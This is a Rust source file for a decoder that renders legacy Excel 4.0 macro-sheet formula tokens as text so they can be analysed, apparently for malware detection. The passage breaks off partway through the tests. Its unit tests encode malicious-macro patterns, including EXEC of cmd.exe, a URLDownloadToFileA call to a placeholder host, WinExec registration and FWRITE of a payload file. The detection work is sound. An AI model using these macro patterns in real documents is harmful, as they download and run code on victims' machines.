//! BIFF5, BIFF7 and BIFF8 formula-token decoding for legacy Excel 4.0 (XLM)
//! macro sheets.
//!
//! Legacy `.xls` workbooks store macro-sheet formulas as compiled RPN token
//! streams (`rgce` in a `FORMULA` record), not as text. The tokens reference
//! functions through the `iftab` index defined by [MS-XLS] 2.5.198.17 Ftab.
//! This module renders those tokens back to human-readable formula text so the
//! normal rule/heuristic pipeline can analyse them as source.
//!
//! Scope and honesty rules:
//!
//! * **BIFF5, BIFF7 and BIFF8.** BIFF5/7 use one-byte strings, three-byte cell
//!   references and a 14-byte name/3-D header; BIFF8 uses Unicode strings and
//!   four-byte references. BIFF4 and earlier are not decoded.
//! * **Bounded.** Token count, stack depth and rendered text are capped.
//! * **No invention.** Unknown function ids are rendered as `FUNC_0xNNNN` or
//!   `MACRO_0xNNNN`, and the result is marked incomplete; they are never given
//!   a guessed name.
//! * **Arrays and memory tokens.** `PtgArray` is resolved through the matching
//!   `PtgExtraArray` in the record's `RgbExtra`; `PtgMemArea`, `PtgMemErr`,
//!   `PtgMemNoMem` and `PtgMemFunc` headers are skipped so the reference
//!   expression they wrap is still decoded.
//! * **No execution.** This is a display/analysis decoder. It does not evaluate
//!   formulas, resolve external references, or read referenced cells.

#[path = "biff_ftab.rs"]
mod biff_ftab;

use biff_ftab::FTAB;

/// Maximum number of RPN tokens decoded from one formula.
const MAX_TOKENS: usize = 4096;
/// Maximum operand stack depth. A malformed formula must not grow without bound.
const MAX_STACK: usize = 1024;
/// Maximum number of constant values rendered for one array token.
const MAX_ARRAY_ELEMENTS: usize = 256;

/// BIFF formula-token flavour.
///
/// BIFF5 (Excel 5.0/95) and BIFF7 share one token layout; BIFF8 (Excel 97 and
/// later) is different. The raw BOF version is not monotonic (BIFF7 is 0x0700
/// while BIFF8 is 0x0600), so callers must map it explicitly.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BiffVersion {
    Biff5,
    Biff7,
    Biff8,
}

impl BiffVersion {
    /// Maps a BOF version word to a supported token layout.
    pub fn from_code(code: u16) -> Option<Self> {
        match code {
            0x0500 => Some(Self::Biff5),
            0x0700 => Some(Self::Biff7),
            0x0600 => Some(Self::Biff8),
            _ => None,
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            Self::Biff5 => "BIFF5",
            Self::Biff7 => "BIFF7",
            Self::Biff8 => "BIFF8",
        }
    }

    fn is_biff8(self) -> bool {
        matches!(self, Self::Biff8)
    }
}

/// A decoded formula and whether every token was understood completely.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DecodedFormula {
    pub text: String,
    pub complete: bool,
}

/// Looks up an `iftab` id in the generated MS-XLS Ftab table.
fn ftab(id: u16) -> Option<(&'static str, u8)> {
    FTAB.binary_search_by_key(&id, |entry| entry.0)
        .ok()
        .map(|index| (FTAB[index].1, FTAB[index].2))
}

/// Decodes one BIFF8 `rgce` token stream.
///
/// This is the BIFF8 convenience wrapper; use [`decode_with_version`] for
/// BIFF5/BIFF7 and [`decode_with_extra`] when the record's `RgbExtra` bytes are
/// available.
pub fn decode(rgce: &[u8], max_text: usize) -> DecodedFormula {
    decode_with_version(rgce, max_text, BiffVersion::Biff8)
}

/// Decodes one `rgce` token stream using the given BIFF token layout.
///
/// `max_text` caps the rendered text in characters; a capped result is marked
/// incomplete. The function never panics on malformed input. Array constants
/// are rendered as `ARRAY(?)` and marked incomplete because their values live
/// in the record's `RgbExtra`, which this wrapper does not receive.
pub fn decode_with_version(
    rgce: &[u8],
    max_text: usize,
    version: BiffVersion,
) -> DecodedFormula {
    decode_with_extra(rgce, &[], max_text, version)
}

/// Decodes one `rgce` token stream together with its `RgbExtra` bytes.
///
/// For a `FORMULA` record, `extra` is the `rgcb` field that follows `rgce`; it
/// carries the `PtgExtraArray` values for every `PtgArray` token, in the order
/// the tokens appear (MS-XLS 2.5.198.103). `max_text` caps the rendered text in
/// characters; a capped result is marked incomplete. The function never panics
/// on malformed input.
pub fn decode_with_extra(
    rgce: &[u8],
    extra: &[u8],
    max_text: usize,
    version: BiffVersion,
) -> DecodedFormula {
    let biff8 = version.is_biff8();
    let mut stack: Vec<String> = Vec::new();
    let mut pos = 0usize;
    let mut extra_pos = 0usize;
    let mut complete = true;
    let mut tokens = 0usize;
    let mut unknown_functions = 0usize;

    while pos < rgce.len() {
        if tokens >= MAX_TOKENS || stack.len() > MAX_STACK {
            complete = false;
            break;
        }
        let op = rgce[pos];
        pos += 1;

        match op {
            // Binary operators: add, sub, mul, div, power, concat, LT, LE, EQ,
            // GE, GT, NE. RPN pushes the left operand before the right.
            0x03..=0x0E => {
                let symbol = match op {
                    0x03 => "+",
                    0x04 => "-",
                    0x05 => "*",
                    0x06 => "/",
                    0x07 => "^",
                    0x08 => "&",
                    0x09 => "<",
                    0x0A => "<=",
                    0x0B => "=",
                    0x0C => ">=",
                    0x0D => ">",
                    _ => "<>",
                };
                if stack.len() < 2 {
                    complete = false;
                    break;
                }
                let right = stack.pop().unwrap_or_default();
                let left = stack.pop().unwrap_or_default();
                stack.push(format!("({left} {symbol} {right})"));
            }
            // Unary plus, unary minus, percent.
            0x12 => {
                if stack.is_empty() {
                    complete = false;
                    break;
                }
            }
            0x13 => {
                let Some(value) = stack.pop() else {
                    complete = false;
                    break;
                };
                stack.push(format!("-({value})"));
            }
            0x14 => {
                let Some(value) = stack.pop() else {
                    complete = false;
                    break;
                };
                stack.push(format!("({value})%"));
            }
            // Parenthesis token: only a display hint in the token stream.
            0x15 => {}
            // Missing argument.
            0x16 => stack.push(String::new()),
            // String literal. BIFF8 uses a flags byte and optional UTF-16;
            // BIFF5/7 use a one-byte code-page string with no flags byte.
            0x17 => {
                let parsed = if biff8 {
                    read_string(rgce, pos)
                } else {
                    read_byte_string(rgce, pos)
                };
                match parsed {
                    Some((value, next)) => {
                        pos = next;
                        stack.push(quote(&value));
                    }
                    None => {
                        complete = false;
                        break;
                    }
                }
            }
            // Attribute token. `tAttrSum` wraps the current top as SUM(arg);
            // `tAttrChoose` carries a jump table that must be skipped.
            0x19 => {
                if pos + 3 > rgce.len() {
                    complete = false;
                    break;
                }
                let subop = rgce[pos];
                let count = u16::from_le_bytes([rgce[pos + 1], rgce[pos + 2]]);
                pos += 3;
                if subop == 0x10 {
                    let Some(value) = stack.pop() else {
                        complete = false;
                        break;
                    };
                    stack.push(format!("SUM({value})"));
                } else if subop == 0x04 {
                    // The choose jump table follows the 4-byte attribute token.
                    let extra = (count as usize).saturating_mul(2).saturating_add(2);
                    if pos + extra > rgce.len() {
                        complete = false;
                        break;
                    }
                    pos += extra;
                }
            }
            // Error literal.
            0x1C => {
                if pos >= rgce.len() {
                    complete = false;
                    break;
                }
                stack.push(error_text(rgce[pos]).to_string());
                pos += 1;
            }
            // Boolean literal.
            0x1D => {
                if pos >= rgce.len() {
                    complete = false;
                    break;
                }
                stack.push(if rgce[pos] == 0 { "FALSE" } else { "TRUE" }.to_string());
                pos += 1;
            }
            // Unsigned 16-bit integer literal.
            0x1E => {
                if pos + 2 > rgce.len() {
                    complete = false;
                    break;
                }
                let value = u16::from_le_bytes([rgce[pos], rgce[pos + 1]]);
                pos += 2;
                stack.push(value.to_string());
            }
            // IEEE-754 double literal.
            0x1F => {
                if pos + 8 > rgce.len() {
                    complete = false;
                    break;
                }
                let bytes: [u8; 8] = rgce[pos..pos + 8].try_into().unwrap_or_default();
                pos += 8;
                stack.push(number_text(f64::from_le_bytes(bytes)));
            }
            // Fixed-argument function.
            0x21 | 0x41 | 0x61 => {
                if pos + 2 > rgce.len() {
                    complete = false;
                    break;
                }
                let id = u16::from_le_bytes([rgce[pos], rgce[pos + 1]]);
                pos += 2;
                let Some((name, arity)) = ftab(id) else {
                    unknown_functions += 1;
                    stack.push(format!("FUNC_0x{id:04X}"));
                    tokens += 1;
                    continue;
                };
                if !push_call(name, arity as usize, &mut stack) {
                    complete = false;
                    break;
                }
            }
            // Variable-argument function. In a macro sheet the high bit of the
            // function id marks an XLM macro function (MS-XLS `ptgFuncVar`).
            0x22 | 0x42 | 0x62 => {
                if pos + 3 > rgce.len() {
                    complete = false;
                    break;
                }
                let nargs = (rgce[pos] & 0x7F) as usize;
                let raw_id = u16::from_le_bytes([rgce[pos + 1], rgce[pos + 2]]);
                pos += 3;
                let macro_bit = raw_id & 0x8000 != 0;
                let id = raw_id & 0x7FFF;
                let name = match ftab(id) {
                    Some((name, _)) => name,
                    None => {
                        unknown_functions += 1;
                        // The rendered text is still honest about the id and
                        // argument count, but the function is not identified.
                        let placeholder = if macro_bit {
                            format!("MACRO_0x{id:04X}")
                        } else {
                            format!("FUNC_0x{id:04X}")
                        };
                        if !push_call(&placeholder, nargs, &mut stack) {
                            complete = false;
                            break;
                        }
                        tokens += 1;
                        continue;
                    }
                };
                if !push_call(name, nargs, &mut stack) {
                    complete = false;
                    break;
                }
            }
            // Defined name. BIFF8 carries 4 body bytes; BIFF5/7 carry 14.
            0x23 | 0x43 | 0x63 => {
                let body_len = if biff8 { 4 } else { 14 };
                if pos + body_len > rgce.len() {
                    complete = false;
                    break;
                }
                let index = u16::from_le_bytes([rgce[pos], rgce[pos + 1]]);
                pos += body_len;
                stack.push(format!("NAME_{index}"));
            }
            // Cell reference. BIFF8: 2-byte row + 2-byte column. BIFF5/7:
            // 2-byte row (relative flags in the top bits) + 1-byte column.
            0x24 | 0x44 | 0x64 => {
                let (row, col) = if biff8 {
                    if pos + 4 > rgce.len() {
                        complete = false;
                        break;
                    }
                    let row = u16::from_le_bytes([rgce[pos], rgce[pos + 1]]) & 0x3FFF;
                    let col = u16::from_le_bytes([rgce[pos + 2], rgce[pos + 3]]) & 0x3FFF;
                    pos += 4;
                    (row, col)
                } else {
                    if pos + 3 > rgce.len() {
                        complete = false;
                        break;
                    }
                    let row = u16::from_le_bytes([rgce[pos], rgce[pos + 1]]) & 0x3FFF;
                    let col = u16::from(rgce[pos + 2]);
                    pos += 3;
                    (row, col)
                };
                stack.push(a1(row, col));
            }
            // Cell area. BIFF8: four 2-byte fields. BIFF5/7: two 2-byte rows
            // followed by two 1-byte columns.
            0x25 | 0x45 | 0x65 => {
                let (first_row, last_row, first_col, last_col) = if biff8 {
                    if pos + 8 > rgce.len() {
                        complete = false;
                        break;
                    }
                    let first_row = u16::from_le_bytes([rgce[pos], rgce[pos + 1]]) & 0x3FFF;
                    let last_row = u16::from_le_bytes([rgce[pos + 2], rgce[pos + 3]]) & 0x3FFF;
                    let first_col = u16::from_le_bytes([rgce[pos + 4], rgce[pos + 5]]) & 0x3FFF;
                    let last_col = u16::from_le_bytes([rgce[pos + 6], rgce[pos + 7]]) & 0x3FFF;
                    pos += 8;
                    (first_row, last_row, first_col, last_col)
                } else {
                    if pos + 6 > rgce.len() {
                        complete = false;
                        break;
                    }
                    let first_row = u16::from_le_bytes([rgce[pos], rgce[pos + 1]]) & 0x3FFF;
                    let last_row = u16::from_le_bytes([rgce[pos + 2], rgce[pos + 3]]) & 0x3FFF;
                    let first_col = u16::from(rgce[pos + 4]);
                    let last_col = u16::from(rgce[pos + 5]);
                    pos += 6;
                    (first_row, last_row, first_col, last_col)
                };
                stack.push(format!(
                    "{}:{}",
                    a1(first_row, first_col),
                    a1(last_row, last_col)
                ));
            }
            // Shared-formula reference: the text lives in another FORMULA record.
            0x01 => {
                if pos + 4 > rgce.len() {
                    complete = false;
                    break;
                }
                pos += 4;
                stack.push("SHARED_FORMULA".to_string());
            }
            // Table token.
            0x02 => {
                if pos + 4 > rgce.len() {
                    complete = false;
                    break;
                }
                pos += 4;
                stack.push("TABLE".to_string());
            }
            // External name. BIFF8 carries 4 body bytes; BIFF5/7 carry 24.
            0x39 | 0x59 | 0x79 => {
                let body_len = if biff8 { 4 } else { 24 };
                if pos + body_len > rgce.len() {
                    complete = false;
                    break;
                }
                let index = u16::from_le_bytes([rgce[pos + 2], rgce[pos + 3]]);
                pos += body_len;
                stack.push(format!("NAME_{index}"));
            }
            // 3-D cell reference. BIFF8: 2-byte ixti + 4-byte ref. BIFF5/7:
            // 14-byte external-reference header + 3-byte ref.
            0x3A | 0x5A | 0x7A => {
                let (ixti, row, col) = if biff8 {
                    if pos + 6 > rgce.len() {
                        complete = false;
                        break;
                    }
                    let ixti = u16::from_le_bytes([rgce[pos], rgce[pos + 1]]);
                    let row = u16::from_le_bytes([rgce[pos + 2], rgce[pos + 3]]) & 0x3FFF;
                    let col = u16::from_le_bytes([rgce[pos + 4], rgce[pos + 5]]) & 0x3FFF;
                    pos += 6;
                    (ixti, row, col)
                } else {
                    if pos + 17 > rgce.len() {
                        complete = false;
                        break;
                    }
                    let ixti = u16::from_le_bytes([rgce[pos], rgce[pos + 1]]);
                    let row = u16::from_le_bytes([rgce[pos + 14], rgce[pos + 15]]) & 0x3FFF;
                    let col = u16::from(rgce[pos + 16]);
                    pos += 17;
                    (ixti, row, col)
                };
                stack.push(format!("[ext:{ixti}]{}", a1(row, col)));
            }
            // 3-D area reference. BIFF8: 2-byte ixti + 8-byte area. BIFF5/7:
            // 14-byte external-reference header + 6-byte area.
            0x3B | 0x5B | 0x7B => {
                let (ixti, first_row, last_row, first_col, last_col) = if biff8 {
                    if pos + 10 > rgce.len() {
                        complete = false;
                        break;
                    }
                    let ixti = u16::from_le_bytes([rgce[pos], rgce[pos + 1]]);
                    let first_row = u16::from_le_bytes([rgce[pos + 2], rgce[pos + 3]]) & 0x3FFF;
                    let last_row = u16::from_le_bytes([rgce[pos + 4], rgce[pos + 5]]) & 0x3FFF;
                    let first_col = u16::from_le_bytes([rgce[pos + 6], rgce[pos + 7]]) & 0x3FFF;
                    let last_col = u16::from_le_bytes([rgce[pos + 8], rgce[pos + 9]]) & 0x3FFF;
                    pos += 10;
                    (ixti, first_row, last_row, first_col, last_col)
                } else {
                    if pos + 20 > rgce.len() {
                        complete = false;
                        break;
                    }
                    let ixti = u16::from_le_bytes([rgce[pos], rgce[pos + 1]]);
                    let first_row = u16::from_le_bytes([rgce[pos + 14], rgce[pos + 15]]) & 0x3FFF;
                    let last_row = u16::from_le_bytes([rgce[pos + 16], rgce[pos + 17]]) & 0x3FFF;
                    let first_col = u16::from(rgce[pos + 18]);
                    let last_col = u16::from(rgce[pos + 19]);
                    pos += 20;
                    (ixti, first_row, last_row, first_col, last_col)
                };
                stack.push(format!(
                    "[ext:{ixti}]{}:{}",
                    a1(first_row, first_col),
                    a1(last_row, last_col)
                ));
            }
            // Deleted-reference tokens. BIFF5/7 carry a 3-byte cell or 6-byte
            // area; BIFF8 has different sizes and falls through to the
            // unsupported path instead of being misread.
            0x2A | 0x6A if !biff8 => {
                if pos + 3 > rgce.len() {
                    complete = false;
                    break;
                }
                pos += 3;
                stack.push("#REF!".to_string());
            }
            0x2B | 0x6B if !biff8 => {
                if pos + 6 > rgce.len() {
                    complete = false;
                    break;
                }
                pos += 6;
                stack.push("#REF!".to_string());
            }
            // Array constant. The inline token is eight bytes (the ptg byte
            // plus seven undefined bytes, MS-XLS 2.5.198.32); the values are the
            // matching `PtgExtraArray` in the record's `RgbExtra`. Without that
            // extra data the shape is unknown, so the token is rendered as a
            // placeholder and the formula is marked incomplete.
            0x20 | 0x40 | 0x60 => {
                if pos + 7 > rgce.len() {
                    complete = false;
                    break;
                }
                pos += 7;
                match read_array_constant(extra, &mut extra_pos) {
                    Some(text) => stack.push(text),
                    None => {
                        complete = false;
                        stack.push("ARRAY(?)".to_string());
                    }
                }
            }
            // Memory-area tokens. The header is size metadata only; the
            // binary-reference-expression they wrap follows inline in the token
            // stream, so it is decoded normally and the wrapper leaves the stack
            // untouched. `PtgExtraMem` in the RgbExtra duplicates the resolved
            // range and is not needed to render the expression.
            0x26 | 0x46 | 0x66 | 0x27 | 0x47 | 0x67 | 0x28 | 0x48 | 0x68 => {
                if pos + 6 > rgce.len() {
                    complete = false;
                    break;
                }
                pos += 6;
            }
            // Memory-function token: just the ptg byte and the byte count.
            0x29 | 0x49 | 0x69 => {
                if pos + 2 > rgce.len() {
                    complete = false;
                    break;
                }
                pos += 2;
            }
            // Remaining tokens (PtgElf*, tables and anything else this decoder
            // does not model) need payload layouts that are not implemented.
            // Refuse to guess rather than emit wrong text.
            _ => {
                complete = false;
                break;
            }
        }
        tokens += 1;
    }

    if unknown_functions > 0 {
        complete = false;
    }
    if stack.len() != 1 {
        complete = false;
    }
    let mut text = if stack.len() == 1 {
        stack.pop().unwrap_or_default()
    } else {
        stack.join(" | ")
    };
    if text.chars().count() > max_text {
        text = text.chars().take(max_text).collect();
        complete = false;
    }
    DecodedFormula { text, complete }
}

fn push_call(name: &str, nargs: usize, stack: &mut Vec<String>) -> bool {
    if stack.len() < nargs {
        return false;
    }
    let args = stack.split_off(stack.len() - nargs);
    stack.push(format!("{name}({})", args.join(",")));
    true
}

/// Reads the `PtgExtraArray` that belongs to the next `PtgArray` token.
///
/// The layout is `cols` (one byte, one less than the column count), `rows` (two
/// bytes, one less than the row count) and then `cols * rows` constant values in
/// row-major order (MS-XLS 2.5.198.59). Returns `None` when the extra data is
/// missing, truncated or larger than the element cap.
fn read_array_constant(data: &[u8], pos: &mut usize) -> Option<String> {
    let cols = usize::from(*data.get(*pos)?) + 1;
    let rows = usize::from(u16::from_le_bytes([
        *data.get(*pos + 1)?,
        *data.get(*pos + 2)?,
    ])) + 1;
    *pos += 3;
    let count = cols.checked_mul(rows)?;
    if count == 0 || count > MAX_ARRAY_ELEMENTS {
        return None;
    }
    let mut out = String::from("{");
    for row in 0..rows {
        if row > 0 {
            out.push(';');
        }
        for col in 0..cols {
            if col > 0 {
                out.push(',');
            }
            out.push_str(&read_array_value(data, pos)?);
        }
    }
    out.push('}');
    Some(out)
}

/// Reads one constant value of a `PtgExtraArray` (MS-XLS 2.5.7 constant values,
/// as implemented by Apache POI's `ConstantValueParser`). Every fixed-width
/// kind carries an eight-byte payload.
fn read_array_value(data: &[u8], pos: &mut usize) -> Option<String> {
    let kind = *data.get(*pos)?;
    *pos += 1;
    match kind {
        // Empty cell: eight unused bytes.
        0x00 => {
            skip_bytes(data, pos, 8)?;
            Some(String::new())
        }
        // IEEE-754 double.
        0x01 => {
            let raw = data.get(*pos..(*pos).checked_add(8)?)?;
            *pos += 8;
            let bytes: [u8; 8] = raw.try_into().ok()?;
            Some(number_text(f64::from_le_bytes(bytes)))
        }
        // XLUnicodeString: two-byte length, one byte of flags, then characters.
        0x02 => {
            let cch = usize::from(u16::from_le_bytes([
                *data.get(*pos)?,
                *data.get(*pos + 1)?,
            ]));
            let flags = *data.get(*pos + 2)?;
            *pos += 3;
            if flags & 0x01 == 1 {
                let mut units = Vec::with_capacity(cch.min(1024));
                for index in 0..cch {
                    let at = *pos + index * 2;
                    let pair = data.get(at..at.checked_add(2)?)?;
                    units.push(u16::from_le_bytes([pair[0], pair[1]]));
                }
                *pos += cch.checked_mul(2)?;
                Some(quote(&String::from_utf16_lossy(&units)))
            } else {
                let raw = data.get(*pos..(*pos).checked_add(cch)?)?;
                *pos += cch;
                let value: String = raw.iter().map(|&byte| char::from(byte)).collect();
                Some(quote(&value))
            }
        }
        // Boolean: eight-byte payload whose first byte is 0 or 1.
        0x04 => {
            let payload = data.get(*pos..(*pos).checked_add(8)?)?;
            *pos += 8;
            Some(if payload[0] == 0 { "FALSE" } else { "TRUE" }.to_string())
        }
        // Error code: two-byte code plus six unused bytes.
        0x10 => {
            let payload = data.get(*pos..(*pos).checked_add(8)?)?;
            *pos += 8;
            Some(error_text(payload[0]).to_string())
        }
        _ => None,
    }
}

fn skip_bytes(data: &[u8], pos: &mut usize, len: usize) -> Option<()> {
    data.get(*pos..(*pos).checked_add(len)?)?;
    *pos += len;
    Some(())
}

fn read_string(data: &[u8], pos: usize) -> Option<(String, usize)> {
    let cch = *data.get(pos)? as usize;
    let flags = *data.get(pos + 1)?;
    let mut next = pos + 2;
    if flags & 0x01 == 1 {
        let bytes = cch.checked_mul(2)?;
        let raw = data.get(next..next.checked_add(bytes)?)?;
        let units: Vec<u16> = raw
            .chunks_exact(2)
            .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
            .collect();
        next += bytes;
        Some((String::from_utf16_lossy(&units), next))
    } else {
        let raw = data.get(next..next.checked_add(cch)?)?;
        next += cch;
        Some((String::from_utf8_lossy(raw).into_owned(), next))
    }
}

/// Reads a BIFF5/BIFF7 one-byte code-page string. The workbook code page is
/// not resolved here; bytes are mapped as Latin-1 so ASCII commands and URLs
/// remain exact.
fn read_byte_string(data: &[u8], pos: usize) -> Option<(String, usize)> {
    let cch = *data.get(pos)? as usize;
    let start = pos + 1;
    let raw = data.get(start..start.checked_add(cch)?)?;
    let value = raw.iter().map(|&byte| char::from(byte)).collect();
    Some((value, start + cch))
}

fn quote(value: &str) -> String {
    format!("\"{}\"", value.replace('"', "\"\""))
}

fn error_text(code: u8) -> &'static str {
    match code {
        0x00 => "#NULL!",
        0x07 => "#DIV/0!",
        0x0F => "#VALUE!",
        0x17 => "#REF!",
        0x1D => "#NAME?",
        0x24 => "#NUM!",
        0x2A => "#N/A",
        _ => "#ERROR!",
    }
}

fn number_text(value: f64) -> String {
    if value.is_finite() && value.fract() == 0.0 && value.abs() < 1e15 {
        format!("{}", value as i64)
    } else {
        format!("{value}")
    }
}

fn a1(row: u16, col: u16) -> String {
    format!("{}{}", column_name(col & 0x3FFF), u32::from(row) + 1)
}

fn column_name(col: u16) -> String {
    let mut number = u32::from(col) + 1;
    let mut out = String::new();
    while number > 0 {
        let digit = ((number - 1) % 26) as u8;
        out.insert(0, char::from(b'A' + digit));
        number = (number - 1) / 26;
    }
    out
}

#[cfg(test)]
pub(crate) mod fixtures {
    /// Encodes a BIFF5/BIFF7 `ptgStr` token (one-byte length, Latin-1 bytes).
    pub fn ptg_str_latin1(value: &str) -> Vec<u8> {
        let bytes: Vec<u8> = value.bytes().take(255).collect();
        let mut out = vec![0x17, bytes.len() as u8];
        out.extend_from_slice(&bytes);
        out
    }

    /// Encodes a BIFF8 `ptgStr` token (UTF-16LE string literal).
    pub fn ptg_str(value: &str) -> Vec<u8> {
        let units: Vec<u16> = value.encode_utf16().collect();
        let mut out = Vec::new();
        out.push(0x17);
        out.push(units.len().min(255) as u8);
        out.push(0x01); // fHighByte: UTF-16LE
        for unit in units.iter().take(255) {
            out.extend_from_slice(&unit.to_le_bytes());
        }
        out
    }

    /// Encodes a BIFF8 `ptgInt` token.
    pub fn ptg_int(value: u16) -> Vec<u8> {
        let mut out = vec![0x1E];
        out.extend_from_slice(&value.to_le_bytes());
        out
    }

    /// Encodes a BIFF8 `ptgNum` token.
    pub fn ptg_num(value: f64) -> Vec<u8> {
        let mut out = vec![0x1F];
        out.extend_from_slice(&value.to_le_bytes());
        out
    }

    /// Encodes a BIFF8 `ptgFuncVar` token; `macro_call` sets the XLM bit.
    pub fn ptg_func_var(id: u16, nargs: u8, macro_call: bool) -> Vec<u8> {
        let id = if macro_call { id | 0x8000 } else { id };
        let mut out = vec![0x22, nargs & 0x7F];
        out.extend_from_slice(&id.to_le_bytes());
        out
    }

    /// Wraps an `rgce` token stream in a `FORMULA` record. The 22-byte header
    /// layout is the same for BIFF5, BIFF7 and BIFF8.
    pub fn formula_record(rgce: &[u8]) -> Vec<u8> {
        formula_record_with_extra(rgce, &[])
    }

    /// Wraps a token stream plus its `RgbExtra` (`rgcb`) bytes in a `FORMULA`
    /// record.
    pub fn formula_record_with_extra(rgce: &[u8], rgcb: &[u8]) -> Vec<u8> {
        let mut body = Vec::new();
        body.extend_from_slice(&0u16.to_le_bytes()); // rw
        body.extend_from_slice(&0u16.to_le_bytes()); // col
        body.extend_from_slice(&0u16.to_le_bytes()); // ixfe
        body.extend_from_slice(&0f64.to_le_bytes()); // num
        body.extend_from_slice(&0u16.to_le_bytes()); // grbit
        body.extend_from_slice(&0u32.to_le_bytes()); // chn
        body.extend_from_slice(&(rgce.len() as u16).to_le_bytes()); // cce
        body.extend_from_slice(rgce);
        body.extend_from_slice(rgcb);

        let mut out = Vec::new();
        out.extend_from_slice(&0x0006u16.to_le_bytes());
        out.extend_from_slice(&(body.len() as u16).to_le_bytes());
        out.extend_from_slice(&body);
        out
    }

    /// Encodes a `PtgArray` token plus the matching `PtgExtraArray` values.
    /// Returns the inline token and the `RgbExtra` bytes for it.
    pub fn array_constant(cols: u8, rows: u16, values: &[f64]) -> (Vec<u8>, Vec<u8>) {
        let token = vec![0x20, 0, 0, 0, 0, 0, 0, 0];
        let mut extra = Vec::new();
        extra.push(cols.saturating_sub(1));
        extra.extend_from_slice(&rows.saturating_sub(1).to_le_bytes());
        for value in values {
            extra.push(0x01);
            extra.extend_from_slice(&value.to_le_bytes());
        }
        (token, extra)
    }
}

#[cfg(test)]
mod tests {
    use super::fixtures::{
        array_constant, formula_record, ptg_func_var, ptg_int, ptg_num, ptg_str, ptg_str_latin1,
    };
    use super::*;

    #[test]
    fn exec_is_decoded_from_a_macro_call_token() {
        let mut rgce = ptg_str("cmd.exe /c calc");
        rgce.extend_from_slice(&ptg_func_var(0x006E, 1, true));
        let decoded = decode(&rgce, 64 * 1024);
        assert!(decoded.complete, "{decoded:?}");
        assert_eq!(decoded.text, "EXEC(\"cmd.exe /c calc\")");
    }

    #[test]
    fn call_and_register_use_their_ftab_ids() {
        let mut call = ptg_str("urlmon");
        call.extend_from_slice(&ptg_str("URLDownloadToFileA"));
        call.extend_from_slice(&ptg_str("http://example.invalid/a.exe"));
        call.extend_from_slice(&ptg_func_var(0x0096, 3, true));
        let decoded = decode(&call, 64 * 1024);
        assert!(decoded.complete, "{decoded:?}");
        assert_eq!(
            decoded.text,
            "CALL(\"urlmon\",\"URLDownloadToFileA\",\"http://example.invalid/a.exe\")"
        );

        let mut register = ptg_str("kernel32");
        register.extend_from_slice(&ptg_str("WinExec"));
        register.extend_from_slice(&ptg_str("JC"));
        register.extend_from_slice(&ptg_func_var(0x0095, 3, true));
        assert_eq!(
            decode(&register, 64 * 1024).text,
            "REGISTER(\"kernel32\",\"WinExec\",\"JC\")"
        );
    }

    #[test]
    fn file_io_and_control_functions_are_named() {
        let mut write = ptg_str("C:\\payload.exe");
        write.extend_from_slice(&ptg_str("MZ"));
        write.extend_from_slice(&ptg_func_var(0x008A, 2, true)); // FWRITE
        let decoded = decode(&write, 64 * 1024);
        assert!(decoded.complete, "{decoded:?}");
        assert_eq!(decoded.text, "FWRITE(\"C:\\payload.exe\",\"MZ\")");

        let halt = ptg_func_var(0x0036, 0, true);
        assert_eq!(decode(&halt, 64 * 1024).text, "HALT()");

        let ret = ptg_func_var(0x0037, 0, true);
        assert_eq!(decode(&ret, 64 * 1024).text, "RETURN()");
    }

    #[test]
    fn arithmetic_numbers_and_references_render() {
        let mut rgce = vec![0x1E, 1, 0, 0x1E, 2, 0, 0x03];
        assert_eq!(decode(&rgce, 64 * 1024).text, "(1 + 2)");

        rgce = ptg_num(1.5);
        rgce.extend_from_slice(&ptg_int(2));
        rgce.push(0x03);
        assert_eq!(decode(&rgce, 64 * 1024).text, "(1.5 + 2)");

        // Reference to row 1, column B (zero-based).
        let mut reference = vec![0x24, 0, 0, 1, 0];
        reference.extend_from_slice(&ptg_int(2));
        reference.push(0x03);
        assert_eq!(decode(&reference, 64 * 1024).text, "(B1 + 2)");
    }

    #[test]
    fn an_unknown_macro_function_is_not_given_a_guessed_name() {
        let mut rgce = ptg_str("x");
        rgce.extend_from_slice(&ptg_func_var(0x0200, 1, true));
        let decoded = decode(&rgce, 64 * 1024);
        assert_eq!(decoded.text, "MACRO_0x0200(\"x\")");
        assert!(!decoded.complete);
    }

    #[test]
    fn truncated_tokens_are_reported_and_never_panic() {
        let decoded = decode(&[0x1E, 0x01], 64 * 1024);
        assert!(!decoded.complete);
        assert!(decoded.text.is_empty() || decoded.text.contains('|'));

        for len in 0..=8 {
            let _ = decode(&[0x1F; 8][..len], 64);
            let _ = decode(&[0x22; 8][..len], 64);
            let _ = decode(&[0x17; 8][..len], 64);
        }
    }

    #[test]
    fn strings_are_escaped_for_rule_matching() {
        let mut rgce = ptg_str("a\"b");
        rgce.extend_from_slice(&ptg_func_var(0x006E, 1, true));
        assert_eq!(decode(&rgce, 64 * 1024).text, "EXEC(\"a\"\"b\")");
    }

    #[test]
    fn biff5_strings_functions_and_cell_references_are_decoded() {
        let mut rgce = ptg_str_latin1("cmd.exe /c calc");
        rgce.extend_from_slice(&ptg_func_var(0x006E, 1, true));
        let decoded = decode_with_version(&rgce, 64 * 1024, BiffVersion::Biff5);
        assert!(decoded.complete, "{decoded:?}");
        assert_eq!(decoded.text, "EXEC(\"cmd.exe /c calc\")");

        // BIFF5 reference: 2-byte row (1) + 1-byte column (1) => B2.
        let mut reference = vec![0x24, 1, 0, 1];
        reference.extend_from_slice(&ptg_int(2));
        reference.push(0x03);
        assert_eq!(
            decode_with_version(&reference, 64 * 1024, BiffVersion::Biff5).text,
            "(B2 + 2)"
        );
    }

    #[test]
    fn biff5_areas_and_names_use_the_biff5_token_sizes() {
        let area = vec![0x25, 0, 0, 1, 0, 0, 1];
        assert_eq!(
            decode_with_version(&area, 64 * 1024, BiffVersion::Biff5).text,
            "A1:B2"
        );

        // BIFF5 ptgName body is 14 bytes; only the first 2 are the name index.
        let mut name = vec![0x23, 3, 0];
        name.extend_from_slice(&[0u8; 12]);
        name.extend_from_slice(&ptg_int(1));
        name.push(0x03);
        assert_eq!(
            decode_with_version(&name, 64 * 1024, BiffVersion::Biff5).text,
            "(NAME_3 + 1)"
        );
    }

    #[test]
    fn biff7_uses_the_biff5_token_layout() {
        let mut rgce = ptg_str_latin1("calc");
        rgce.extend_from_slice(&ptg_func_var(0x006E, 1, true));
        let decoded = decode_with_version(&rgce, 64 * 1024, BiffVersion::Biff7);
        assert!(decoded.complete, "{decoded:?}");
